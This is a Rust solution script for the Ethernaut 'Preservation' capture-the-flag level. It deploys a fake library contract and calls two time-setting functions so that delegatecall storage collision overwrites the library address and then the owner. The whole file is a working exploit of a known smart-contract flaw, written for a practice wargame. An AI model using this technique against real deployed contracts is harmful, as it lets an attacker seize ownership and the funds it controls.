//! Ethernaut 16 — Preservation.
//!
//! Goal: Take ownership of `Preservation`, a timezone-recording contract that
//! uses two `LibraryContract` instances.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Preservation.sol

use alloy::primitives::U256;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl16_preservation::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    FakeLibraryContract,
    "out/PreservationExploit.sol/FakeLibraryContract.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let provider = offender.provider();
        let fake = FakeLibraryContract::deploy(provider).await?;

        let contract = Preservation::new(target.address, provider);
        let tz_lib1 = contract.timeZone1Library().call().await?;

        let time = U256::try_from_be_slice(fake.address().as_slice())
            .ok_or(eyre::Report::msg("try from be slice should succeed"))?;

        let gas = 1_000_000;
        contract.setSecondTime(time).gas(gas).send().await?.watch().await?;
        contract.setFirstTime(time).gas(gas).send().await?.watch().await?;

        let tz_lib1_manipulated = contract.timeZone1Library().call().await?;
        let owner = contract.owner().call().await?;

        println!(
            "tz lib 1 before: {tz_lib1}; after: {tz_lib1_manipulated}; owner: {owner}"
        );

        Ok(())
    }
}
